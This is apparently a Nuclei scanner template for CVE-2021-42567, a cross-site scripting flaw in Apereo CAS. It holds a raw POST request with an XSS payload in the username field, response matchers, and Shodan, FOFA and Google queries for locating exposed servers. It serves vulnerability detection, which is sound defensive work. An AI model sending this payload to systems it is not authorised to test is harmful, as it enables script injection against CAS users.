http:
- matchers:
  - condition: and
    type: word
    words:
    - <img/src/onerror=alert(document.domain)>
    - java.util.HashMap
  - status:
    - 401
    type: status
  matchers-condition: and
  raw:
  - 'POST /cas/v1/tickets/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test

    '
id: CVE-2021-42567
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:apereo:central_authentication_service:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-42567
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97523
    epss-score: 0.46272
  description: Apereo CAS through 6.4.1 allows cross-site scripting via POST requests
    sent to the REST API endpoints.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of a victim''s browser, potentially leading
    to session hijacking, data theft, or defacement.

    '
  metadata:
    fofa-query: title='cas - central authentication service'
    google-query: intitle:'cas - central authentication service'
    max-request: 1
    product: central_authentication_service
    shodan-query:
    - http.title:'CAS - Central Authentication Service'
    - http.title:'cas - central authentication service'
    vendor: apereo
  name: Apereo CAS Cross-Site Scripting
  reference:
  - https://apereo.github.io/2021/10/18/restvuln/
  - https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html
  - https://github.com/sudohyak/exploit/blob/dcf04f704895fe7e042a0cfe9c5ead07797333cc/CVE-2021-42567/README.md
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42567
  - https://github.com/apereo/cas/releases
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2021,cve,apereo,xss,cas,vkev,vuln
